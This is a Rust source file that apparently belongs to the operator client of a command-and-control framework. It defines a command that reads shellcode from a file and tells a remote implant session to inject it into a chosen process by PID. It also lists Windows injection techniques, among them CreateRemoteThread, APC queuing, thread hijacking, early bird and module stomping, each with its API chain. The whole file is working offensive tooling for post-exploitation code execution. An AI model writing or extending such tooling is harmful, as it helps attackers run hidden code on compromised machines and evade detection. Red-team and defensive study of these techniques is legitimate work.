//! Process injection commands

use anyhow::Result;
use std::fs;

use crate::cli::CliState;
use crate::display::{print_error, print_info, print_success};

/// Inject shellcode into a process
pub async fn shellcode(
    cli: &CliState,
    pid: u32,
    shellcode_path: String,
    technique: Option<String>,
) -> Result<()> {
    // Read shellcode file
    let shellcode = match fs::read(&shellcode_path) {
        Ok(data) => data,
        Err(e) => {
            print_error(&format!("Failed to read shellcode file: {}", e));
            return Ok(());
        }
    };

    print_info(&format!(
        "Injecting {} bytes into PID {}...",
        shellcode.len(),
        pid
    ));

    // Map technique name to enum value
    let method = match technique.as_deref() {
        Some("auto") | None => 1,  // AUTO
        Some("win32") => 2,         // WIN32
        Some("ntapi") => 3,         // NT_API
        Some("apc") => 4,           // APC
        Some("hijack") => 5,        // THREAD_HIJACK
        Some("earlybird") => 6,     // EARLY_BIRD
        Some("stomping") => 7,      // MODULE_STOMPING
        Some(t) => {
            print_error(&format!("Unknown technique: {}. Use: auto, win32, ntapi, apc, hijack, earlybird, stomping", t));
            return Ok(());
        }
    };

    let session = cli.active_session().unwrap();

    match cli
        .client
        .inject_shellcode(
            session.full_id.clone(),
            pid,
            shellcode,
            method,
            true,  // wait for completion
            30000, // 30 second timeout
        )
        .await
    {
        Ok(response) => {
            if response.success {
                print_success(&format!(
                    "Shellcode injected successfully (technique: {}{})",
                    response.technique_used,
                    if response.thread_id > 0 {
                        format!(", TID: {}", response.thread_id)
                    } else {
                        String::new()
                    }
                ));
            } else {
                print_error(&format!("Injection failed: {}", response.error));
            }
        }
        Err(e) => {
            print_error(&format!("Failed to inject: {}", e));
        }
    }

    Ok(())
}

/// List available injection techniques
pub fn list_techniques() {
    use crate::theme::Theme;
    use console::style;

    if Theme::is_interactive() {
        println!("\n{}", style("INJECTION TECHNIQUES").fg(crate::theme::colors::LAVENDER).bold());
        println!("  {}      Let framework choose best method", style("auto").fg(crate::theme::colors::TEAL));
        println!("  {}     VirtualAllocEx + CreateRemoteThread", style("win32").fg(crate::theme::colors::TEAL));
        println!("  {}     NtAllocateVirtualMemory + NtCreateThreadEx", style("ntapi").fg(crate::theme::colors::TEAL));
        println!("  {}       NtQueueApcThread (alertable thread)", style("apc").fg(crate::theme::colors::TEAL));
        println!("  {}    Suspend + SetThreadContext + Resume", style("hijack").fg(crate::theme::colors::TEAL));
        println!("  {} Create suspended + APC before resume", style("earlybird").fg(crate::theme::colors::TEAL));
        println!("  {}  Overwrite legitimate DLL .text section\n", style("stomping").fg(crate::theme::colors::TEAL));
    } else {
        println!("\nINJECTION TECHNIQUES");
        println!("  auto       Let framework choose best method");
        println!("  win32      VirtualAllocEx + CreateRemoteThread");
        println!("  ntapi      NtAllocateVirtualMemory + NtCreateThreadEx");
        println!("  apc        NtQueueApcThread (alertable thread)");
        println!("  hijack     Suspend + SetThreadContext + Resume");
        println!("  earlybird  Create suspended + APC before resume");
        println!("  stomping   Overwrite legitimate DLL .text section\n");
    }
}
